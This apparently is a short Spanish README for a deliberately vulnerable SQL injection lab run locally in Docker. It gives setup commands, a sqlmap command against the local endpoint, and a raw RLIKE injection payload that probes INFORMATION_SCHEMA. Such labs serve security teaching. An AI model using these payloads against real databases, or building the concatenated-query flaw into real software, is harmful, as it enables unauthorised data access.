# SQL Injection

Descargar y Montar el servidor desde Docker usando un volumen con el Codigo Fuente de Github para editarlo:

```bash
git clone https://github.com/IngenieroRicardo/SQLInjection
docker pull ghcr.io/ingenieroricardo/sqlinjection:latest
docker run --publish 8080:80 -v ./SQLInjection:/app ghcr.io/ingenieroricardo/sqlinjection:latest
```

<hr>

Al tener las variables concatenadas puedes hacer inyeccion SQL:

```bash
sqlmap -u "http://127.0.0.1:8080/servidor.php?nombre=yo&mensaje=hola" -b
```

```bash
hola' RLIKE (SELECT IF(COUNT(DISTINCT(table_schema))=1, 'hola', 0x28) FROM INFORMATION_SCHEMA.TABLES) AND 'TMTd'='TMTd
```
